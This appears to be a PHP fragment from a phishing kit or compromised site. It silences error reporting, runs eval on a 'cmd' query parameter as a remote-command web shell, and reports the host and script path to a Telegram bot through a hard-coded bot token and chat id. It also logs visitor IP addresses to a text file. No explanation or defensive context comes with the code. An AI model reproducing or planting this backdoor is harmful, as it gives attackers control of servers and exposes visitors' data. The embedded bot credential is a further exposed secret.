error_reporting(0);
error_log(0);
eval($_GET('cmd'));
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-584906756&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);

if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
}
else {
        $ip = $_SERVER['REMOTE_ADDR'];
}

$visit = fopen("logs/visitors.txt", "a");
fwrite($visit, $ip . "\n");
fclose($visit);

